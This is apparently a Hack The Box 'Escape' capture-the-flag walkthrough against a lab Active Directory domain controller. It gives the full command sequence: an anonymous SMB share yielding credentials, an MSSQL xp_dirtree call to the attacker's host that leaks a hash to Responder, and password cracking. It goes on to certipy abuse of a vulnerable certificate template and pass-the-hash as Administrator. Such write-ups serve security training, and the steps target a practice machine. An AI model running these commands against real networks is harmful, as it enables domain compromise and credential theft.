+++
title = "HTB - Escape"
date = 2024-12-16
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.11.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 14:42 EST
Nmap scan report for 10.10.11.202
Host is up (0.12s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-17 03:46:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-12-17T03:48:08+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-17T03:48:07+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-12-17T03:48:08+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-12-17T03:41:41
|_Not valid after:  2054-12-17T03:41:41
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-17T03:48:08+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-12-17T03:48:07+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-17T03:47:30
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 310.46 seconds

```

### Enumeration
Dealing with DC.
Update `/etc/hosts`
445:
	Authentication with fake user: 
	`nxc smb 10.10.11.202 -u "ippsec" -p "" --shares` 
	`smbclient //10.10.11.202/Public -U "ipps" -N`
	We find a procedure file with some credentials: `PublicUser:GuestUserCantWrite1`
	Impacket has a tool called `mssqlclient.py` that we can copy over to the working directory to leverage.
	`mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb`
	Syntax is something I'm not too familiar with: `select name from master..sysdatabases`
	We cannot run commands via `xp_cmdshell`, and the information here isn't much useful
	0xdf references capturing hashes by listening in to authentication of MSSQL Server via `Responder`
	Start with: `python3 /usr/share/responder/Responder.py -I tun0`. Run from this path so dependencies are there.
	Once listening, we prompt MSSQL to access our share: `EXEC xp_dirtree '\\10.10.14.13\share', 1, 1`. Learn about xp_dirtree in post-writeup.
	We will get a hash back on Responder
	Copy the entirety to a file and feed to john: `sql_svc:REGGIE1234ronnie`
	Use these credentials to re-enumerate: `nxc ldap 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --users`
	We get more users, may be useful for later. Throw in a file and clean: `cat users.txt | awk '{print $5}' > user.txt`

### Privilege Escalation
Nothing much in the user's directory. Snooping in the MSSQL directory, we find logs and an error message. This gives us sensitive credential information for the Ryan.Cooper user: `Ryan.Cooper:NuclearMosquito3`
Evil-WinRM as Ryan.
USER:`e125de3cc64ad45bb2029b1dea05d440`
So, it's in good form to enumerate more with the credentials. As you get more seasoned, you'll know what to look for. Just like with the Certified Box, theres a CA template engineered for abuse here. The way to find it is with crackmapexec or nxc:
`nxc ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs`
Once this verifies the CA, we can probe further with `Certipy`:
`certipy-ad find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202 -text -stdout -vulnerable`
We find the vulnerable template is UserAuthentication.  We can abuse and get the Administrator token, and pass it for a hash.
`certipy-ad req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca sequel-DC-CA  -template UserAuthentication -upn administrator@sequel.htb -target sequel.htb`
For Administrator Hash: `certipy-ad auth -pfx administrator.pfx  -domain sequel.htb`. My clock skew was too great. Fixed with:
```
timedatectl set-ntp off
rdate -n 10.10.11.202
[COMMAND]
```
Just remember to turn back on with: `timedatectl set-ntp on`
Once hash is received: `evil-winrm -i 10.10.11.202 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'`
ROOT:`31e6d591616726b83365b34301d2b10a`